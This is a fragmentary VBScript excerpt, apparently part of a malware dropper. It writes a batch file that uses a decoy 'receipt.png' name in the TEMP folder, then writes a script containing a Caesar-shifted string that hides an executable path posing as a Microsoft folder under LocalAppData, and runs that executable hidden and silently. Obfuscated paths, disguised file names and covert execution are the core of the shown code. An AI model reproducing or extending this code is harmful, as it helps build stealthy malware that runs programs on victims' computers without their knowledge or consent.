...
strcmd2 = "@echo off" & vbCrLf & _
	  ...
	  "set ""TEMP_DIR=%TEMP%""" & vbCrLf & _
	  "set ""FILE_NAME1=receipt.png""" & vbCrLf & _
...
file.WriteLine("obLine = ""_Plfurvriw_Lqwhuphgldwh_gdwdsurfhvv1h{h""")
...
file.WriteLine("exeFilePath = localAppDataDir & getString(obLine)")
file.WriteLine("WshShell.Run exeFilePath, 0, False") ' Run the executable silently
file.WriteLine("' Executable Path: ' & localAppDataDir & getString(obLine)")
file.Close
